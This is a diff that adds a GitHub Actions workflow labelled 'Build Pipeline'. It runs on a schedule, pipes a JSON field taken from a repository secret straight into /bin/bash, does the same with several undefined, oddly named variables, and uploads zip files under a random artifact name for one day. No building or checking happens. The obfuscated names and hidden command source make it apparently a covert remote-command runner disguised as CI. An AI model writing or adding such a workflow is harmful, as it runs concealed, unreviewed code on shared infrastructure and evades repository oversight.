@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 2,8,14,20 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          ip7: ${{ secrets.ip7 }}
+        run: |
+          printf '%s' "$ip7" | jq -r .bv924 | /bin/bash
+          echo $g282 | jq -r .ol4251 | /bin/bash
+          echo $r1 | jq -r .fd395 | /bin/bash
+          echo $q055 | jq -r .gzez81 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: lKLFX4lk
+          path: "*.zip"
+          retention-days: 1
